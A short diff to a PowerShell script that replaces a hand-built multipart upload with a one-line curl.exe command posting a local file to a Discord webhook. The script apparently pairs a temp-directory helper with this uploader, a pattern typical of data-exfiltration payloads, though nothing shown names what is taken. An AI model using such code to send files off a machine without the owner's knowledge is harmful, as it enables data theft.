@@ -21,6 +21,8 @@ function TempDir {
 }
 
 
+
+#Function to upload to discord
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -40,19 +42,7 @@ function Upload-Discord {
     }
 
     if (-not ([string]::IsNullOrEmpty($file))){
-        $fileContent = Get-Content -Raw -Path $file
-        $fileBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
-        
-        $filePayload = @{
-            'file' = @{
-                'value' = [System.Convert]::FromBase64String($fileBase64)
-                'options' = @{
-                    'filename' = [System.IO.Path]::GetFileName($file)
-                }
-            }
-        }
-
-        Invoke-RestMethod -Uri $DiscordUrl -Method Post -Body $filePayload
+        curl.exe -F "file1=@$file" $DiscordUrl
     }
 }
 
